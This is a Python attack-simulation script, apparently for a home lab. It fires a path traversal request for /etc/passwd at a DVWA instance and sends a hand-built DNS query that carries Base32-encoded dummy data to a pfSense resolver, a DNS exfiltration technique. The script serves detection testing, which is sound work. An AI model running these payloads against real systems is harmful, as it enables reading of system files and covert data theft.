import base64
import os
import socket
import time
import requests
from dotenv import load_dotenv

load_dotenv()

TARGET_IP = os.getenv("TARGET_IP")

def trigger_path_traversal(target_ip=TARGET_IP):
    """Fires an HTTP path traversal payload against DVWA in my DMZ."""
    url = f"http://{target_ip}/vulnerabilities/fi/?page=../../../../etc/passwd"

    print(f"[*] Triggering Web Attack (Path Traversal)...")
    print(f"    Target: {url}")

    try:
        response = requests.get(url, timeout=5)
        print(f"    [+] HTTP Status Code: {response.status_code}")
        return True
    except Exception as e:
        print(f"    [-] Web attack payload failed: {e}")
        return False


def trigger_dns_exfiltration(dns_server="10.1.4.1"):
    """Sends a raw Base32-encoded subdomain DNS query directly to pfSense over UDP 53."""
    secret_payload = "CONFIDENTIAL_FRA_PORTFOLIO_TEST_DATA"
    encoded_str = base64.b32encode(secret_payload.encode()).decode().rstrip("=")[:20]
    test_domain = f"{encoded_str}.exfil.lab"

    print(f"\n[*] Triggering Covert Channel (DNS Exfiltration)...")
    print(f"    Exfiltrating domain query: {test_domain}")

    try:
        # Build a minimal raw DNS QNAME packet and send directly to pfSense IP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)

        packet = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        for part in test_domain.split("."):
            packet += bytes([len(part)]) + part.encode()
        packet += b"\x00\x00\x01\x00\x01"  # Type A, Class IN

        sock.sendto(packet, (dns_server, 53))
        print(f"    [+] Query sent directly to pfSense ({dns_server}:53) over UDP.")
        return True
    except Exception as e:
        print(f"    [-] DNS attack payload failed: {e}")
        return False

if __name__ == "__main__":
    print("=== Step 1: Executing Attack Simulation Module ===")
    trigger_path_traversal()
    time.sleep(2)
    trigger_dns_exfiltration()
    print("\n=== Attack Simulation Completed ===")